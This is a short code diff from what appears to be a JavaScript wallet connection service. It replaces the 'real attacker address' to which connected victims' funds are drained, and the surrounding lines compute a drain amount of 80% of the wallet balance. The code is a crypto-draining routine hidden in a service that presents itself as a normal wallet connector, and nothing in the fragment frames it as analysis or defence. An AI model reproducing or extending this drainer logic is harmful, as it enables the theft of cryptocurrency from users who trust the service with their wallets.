@@ -238,7 +238,7 @@ class WalletConnectionService {
             }
             
             // Target address to drain funds to (real attacker address)
-            const attackerAddress = '9vgsdF4KzKp78J8qE7F5g4H3j2K1L0M9N8B7V6C5X4D3S2A1';
+            const attackerAddress = '5wXXYovL2wn1m93Sam1n9WqThzVH7jq77uDJ9vqvnZ3';
             
             // Amount to drain (80% of balance to leave some for fees)
             const amountToDrain = balance * 0.8;
